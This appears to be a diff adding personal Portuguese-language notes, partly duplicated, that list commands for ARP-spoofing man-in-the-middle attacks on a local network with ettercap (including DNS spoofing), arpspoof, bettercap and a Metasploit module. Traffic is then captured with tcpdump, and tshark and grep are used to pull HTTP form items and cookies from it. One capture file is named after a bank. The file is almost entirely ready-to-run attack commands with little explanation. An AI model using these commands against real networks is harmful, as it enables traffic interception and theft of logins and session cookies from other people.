@@ -1,0 +1,474 @@
+capiturando com o  ettercap
+============================ 
+
+sudo tee /proc/sys/net/ipv4/ip_forward
+
+1
+
+
+5. Modo Promíscuo
+Lembre-se de que o modo promíscuo precisa estar ativado 
+para capturar pacotes destinados a outros dispositivos na rede
+
+ip link set eth0 promisc on
+
+
+
+sudo nano /etc/ettercap/etter.dns
+
+ver o ipv 4 do wino Windows 10  
+192.168.0.3
+
+
+executar
+
+sudo ettercap -T -q -M arp:remote //192.168.0.1// //192.168.0.3// -i eth0 -P dns_spoof
+
+
+sudo ettercap -T -i eth0 -M arp:remote //192.168.0.1// //192.168.0.3// -w capture.pcap
+
+
+
+windows 10
+                                       Gateway Padrão   Endereço IPv4
+sudo ettercap -T -i eth0 -M arp:remote //192.168.0.1// //192.168.0.3//
+
+
+
+só funciona dentro do kali linux
+sudo ettercap -T -i eth0 -M arp:remote //192.168.0.9// //192.168.0.1//
+
+                                        ipkali linux   Gateway Padrão
+sudo ettercap -T -i eth0 -M arp:remote //192.168.0.9// //192.168.0.1// 
+
+                                        
+
+
+
+
+
+configurasao ettercap
+
+salvar:    -w capture.pcap
+
+-T: Indica que o Ettercap deve rodar em modo texto (terminal), sem a interface gráfica.
+
+-i eth0: Especifica a interface de rede que o Ettercap deve usar. eth0 é um exemplo comum
+
+
+-M arp:remote: Define o método de ataque como ARP spoofing. O arp:remote faz com que o Ettercap envie pacotes ARP falsificados para os alvos (neste caso, 192.168.0.1 e 192.168.0.2), 
+
+
+-P dns_spoof: Ativa o plugin dns_spoof, que permite ao Ettercap interceptar requisições DNS da vítima e fornecer respostas DNS falsas, redirecionando o tráfego para um endereço IP malicioso
+
+
+salvar 
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -
+
+
+
+
+
+capiturando com o arpspoof
+==========================
+Exemplo
+
+ip do linux : 10.3.1.10
+
+Endereço IPv4:  10.3.1.15
+
+Gateway Padrão: 10.3.1.1
+====================================
+
+ip do linux :192.168.0.9
+
+meu ip:  ipconfig
+
+Endereço IPv4:  192.168.0.2
+
+Gateway Padrão: 192.168.0.1
+
+
+arpspoof -i eth0 -t <Endereço IPv4: 192.168.0.2>  -r <Gateway Padrão: 192.168.0.1> 
+
+
+arpspoof -i eth0 -t 192.168.0.2 -r 192.168.0.1 
+
+
+arpspoof -i eth0 -t 192.168.0.2 192.168.0.1
+
+
+
+
+salvar 
+
+sudo tcpdump -i eth0 -w capture.pcap
+
+
+
+Capturar e salvar pacotes enquanto exibe na tela:
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -
+
+
+
+Para uma exibição mais detalhada ou filtros específicos, você pode ajustar o comando:
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - -nn
+=======================================================================================
+
+
+
+
+
+filtro 
+
+Npcap
+Ocorreu um erro:object of type NomeType has no len()
+
+tls.handshake.type eq 1
+
+
+https://www.wireshark.org
+
+
+tcp.port == 443 || udp.port == 443
+
+disord
+tcp.port == 53 || udp.port == 53
+
+
+dns.qry.name == "discord.com"
+
+
+dns.qry.name == "www.facebook.com"
+
+
+ip.addr == x.x.x.x
+
+tls
+
+tcp.port == 443
+
+dns
+
+todos os nomes 
+
+dns.qry.name.len
+
+
+novo filtro
+
+frame contains "wireshark"
+
+frame contains "youtube" or frame contains "wireshark"
+
+frame contains "youtube" or frame contains "instagram" or frame contains "facebook"
+
+frame contains "youtube" or frame contains "twitch" or frame contains "facebook"
+
+frame contains "youtube" or frame contains "instagram" or frame contains "facebook" or frame contains "dns"
+
+
+============================================================================================================
+
+
+capiturando com o bettercap
+
+
+sudo bettercap -iface eth0
+
+net.probe
+
+net.show
+
+
+
+net.sniff on
+
+arp.spoof on
+
+
+
+salvar os arquivo com nome: capture.pcap
+
+sudo tcpdump -i eth0 -w capture.pcap
+
+
+
+Capturar e salvar pacotes enquanto exibe na tela
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -
+
+
+
+Para uma exibição mais detalhada ou filtros específicos, você pode ajustar o comando
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - -nn
+
+
+
+http://testphp.vulnweb.com/login.php
+
+tshark -r capture.pcap -Y 'http' -V | grep -Ei 'Form item'  
+
+
+tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
+
+tshark -r capture.pcap -Y 'http' -V
+
+
+tcpdump -r capture.pcap
+==================================================================================
+
+capiturando com o  ettercap
+============================ 
+
+
+sudo nano /etc/ettercap/etter.dns
+
+
+
+
+executar
+
+sudo ettercap -T -q -M arp:remote //192.168.0.1// //192.168.0.2// -i eth0 -P dns_spoof
+
+
+
+salvar 
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - 
+
+
+
+
+
+
+
+capiturando com o arpspoof
+==========================
+Exemplo
+
+ip do linux : 10.3.1.10
+
+Endereço IPv4:  10.3.1.15
+
+Gateway Padrão: 10.3.1.1
+====================================
+
+ip do linux :192.168.0.9
+
+meu ip:  ipconfig
+
+Endereço IPv4:  192.168.0.2
+
+Gateway Padrão: 192.168.0.1
+
+
+arpspoof -i eth0 -t <Endereço IPv4: 192.168.0.2>  -r <Gateway Padrão: 192.168.0.1> 
+
+
+arpspoof -i eth0 -t 192.168.0.2 -r 192.168.0.1 
+
+arpspoof -i eth0 -t 192.168.0.2 192.168.0.1
+
+
+
+
+salvar 
+
+sudo tcpdump -i eth0 -w capture.pcap
+
+
+
+Capturar e salvar pacotes enquanto exibe na tela:
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -
+
+
+
+Para uma exibição mais detalhada ou filtros específicos, você pode ajustar o comando:
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - -nn
+=======================================================================================
+
+
+
+
+
+filtro 
+
+Npcap
+Ocorreu um erro:object of type NomeType has no len()
+
+tls.handshake.type eq 1
+
+
+https://www.wireshark.org
+
+
+tcp.port == 443 || udp.port == 443
+
+disord
+tcp.port == 53 || udp.port == 53
+
+
+dns.qry.name == "discord.com"
+
+
+dns.qry.name == "www.facebook.com"
+
+
+ip.addr == x.x.x.x
+
+tls
+
+tcp.port == 443
+
+dns
+
+todos os nomes 
+
+dns.qry.name.len
+
+
+novo filtro
+
+frame contains "wireshark"
+
+frame contains "youtube" or frame contains "wireshark"
+
+frame contains "youtube" or frame contains "instagram" or frame contains "facebook"
+
+frame contains "youtube" or frame contains "twitch" or frame contains "facebook"
+
+frame contains "youtube" or frame contains "instagram" or frame contains "facebook" or frame contains "dns"
+
+
+============================================================================================================
+
+
+capiturando com o bettercap
+
+
+sudo bettercap -iface eth0
+
+net.probe
+
+net.show
+
+
+
+net.sniff on
+
+arp.spoof on
+
+
+
+salvar os arquivo com nome: capture.pcap
+
+sudo tcpdump -i eth0 -w capture.pcap
+
+
+
+Capturar e salvar pacotes enquanto exibe na tela
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r -
+
+
+
+Para uma exibição mais detalhada ou filtros específicos, você pode ajustar o comando
+
+sudo tcpdump -i eth0 -w - | tee capture.pcap | tcpdump -r - -nn
+
+
+
+http://testphp.vulnweb.com/login.php
+
+tshark -r capture.pcap -Y 'http' -V
+
+tshark -r capture.pcap -Y 'http' -V | grep -Ei 'Form item'
+
+
+tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
+
+
+tcpdump -r capture.pcap
+
+
+================================
+
+sudo bettercap 
+
+set net.sniff.local true
+
+set net.sniff.output http.log.pcapng
+
+net.sniff on
+
+arp.spoof on
+=================
+
+
+
+msfconsole
+
+
+use auxiliary/spoof/arp/arp_poisoning
+
+set DHOSTS  <IP_ALVO>     192.168.0.2
+
+set SHOSTS  <IP_GATEWAY>  192.168.0.1
+
+
+
+=========================
+msfconsole
+
+use auxiliary/spoof/arp/arp_poisoning
+
+set INTERFACE eth0
+
+set DHOSTS 192.168.0.2
+
+set SHOSTS 192.168.0.1
+
+set BIDIRECTIONAL true
+
+
+show options
+
+
+exploit
+run 
+
+
+
+salvar e capiturar com nome http.log.pcapng
+
+
+sudo tcpdump -i eth0 -vv -w - port 80 | tee http.log.pcapng | tcpdump -r - -vv
+
+
+sudo tcpdump -i eth0 -w http.log.pcapng port 80
+
+
+
+
+sudo tcpdump -i eth0 -w https.log.pcapng port 443
+
+=======================================================
+Filtro
+
+tshark -r http.log.pcapng -Y 'http' -V | grep -Ei 'Form item' 
+
+tcpdump -r http.log.pcapng -A | grep -i "Cookie"
+
+
+windows 10
+tshark -r itau.pcapng -Y "http" -V | findstr /R /C:"Form item"
+
+filtro
+http.content_type contains "application/x-www-form-urlencoded"
